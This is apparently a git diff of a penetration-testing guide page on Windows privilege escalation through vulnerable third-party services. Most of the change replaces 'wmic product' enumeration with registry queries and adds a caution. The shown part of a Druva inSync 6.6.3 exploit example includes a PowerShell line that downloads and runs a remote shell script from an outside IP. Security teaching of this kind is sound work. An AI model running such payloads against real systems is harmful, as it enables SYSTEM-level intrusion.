@@ -10,14 +10,14 @@ sidebar:
   order: 12
   label: Vulnerable services
 ---
+import { Aside } from '@astrojs/starlight/components';
 
 ## TL;DR
 
 A fully-patched, well-configured Windows box can still be escalated through **third-party software** - installed applications and their services often run as SYSTEM and carry their own vulnerabilities. The workflow: list installed programs with versions, confirm the service is running (often on a localhost port), match the version to a public exploit, run it.
 
 ```
-# 1. What's installed, with versions
-wmic product get name, version
+# 1. What's installed, with versions (prefer the registry - see caution below)
 Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | select DisplayName, DisplayVersion
 
 # 2. What's listening locally (SYSTEM services often bind 127.0.0.1)
@@ -41,17 +41,17 @@ This is the path when the privilege/group checks and the ACL audit come up empty
 
 ## Enumerate installed software
 
-```
-wmic product get name, version          # MSI-registered products
-```
-
-`wmic product` is slow and only sees MSI installs; supplement it with the uninstall registry keys (covers more, faster):
+The uninstall registry keys are the safe primary source - fast, and read-only:
 
 ```
 Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*", `
                  "HKLM:\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" |
   select DisplayName, DisplayVersion, Publisher | sort DisplayName
 ```
+
+<Aside type="caution">
+Avoid `wmic product get` / `Get-CimInstance Win32_Product` for inventory. Querying `Win32_Product` makes Windows Installer run a **consistency check on every MSI-installed product**, which can silently trigger repairs and *modify the host during enumeration* - exactly what you don't want on a client machine you're assessing. It's also slow and only sees MSI installs. The registry keys above cover more, faster, without touching anything.
+</Aside>
 
 Anything non-standard - a backup client, a VPN, a vendor "service" - is a lead. Note the **exact version**; LPEs are version-pinned.
 
@@ -70,7 +70,7 @@ get-service | ? {$_.DisplayName -like 'Druva*'}
 
 ## Worked example - Druva inSync 6.6.3
 
-`wmic product` shows `Druva inSync 6.6.3` installed. That version's client service (SYSTEM) exposes an RPC endpoint on `127.0.0.1:6064` that is vulnerable to command injection ([exploit-db 49211](https://www.exploit-db.com/exploits/49211)) - any local user can reach it and run commands as SYSTEM. The PoC is a short PowerShell snippet that frames an RPC message carrying a command:
+The uninstall-key enumeration shows `Druva inSync 6.6.3` installed. That version's client service (SYSTEM) exposes an RPC endpoint on `127.0.0.1:6064` that is vulnerable to command injection ([exploit-db 49211](https://www.exploit-db.com/exploits/49211)) - any local user can reach it and run commands as SYSTEM. The PoC is a short PowerShell snippet that frames an RPC message carrying a command:
 
 ```powershell
 $cmd = "powershell IEX(New-Object Net.Webclient).downloadString('http://10.10.14.140:8080/shell.ps1')"
